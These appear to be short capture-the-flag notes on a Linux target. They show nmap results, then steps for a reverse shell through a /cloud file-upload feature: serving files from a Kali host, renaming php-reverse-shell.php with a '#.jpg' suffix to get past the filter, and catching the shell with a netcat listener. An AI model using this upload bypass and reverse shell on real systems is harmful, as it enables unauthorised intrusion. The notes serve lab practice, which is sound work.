### nmap
PORT    STATE SERVICE     VERSION 
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)  
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))  
139/tcp open  netbios-ssn Samba smbd 4.6.2  
445/tcp open  netbios-ssn Samba smbd 4.6.2  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

## directory enumeration  
/cloud 
File upload from External server.  
1. Start python server on kali machine
python -m http.server  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
2. Rename shell to php-reverse-shell.php#.jpg and also keep php-reverse-shell.php in the same folder  
3. start nc -nlvp 4444  
4. Upload the file  
5. We get reverse shell  


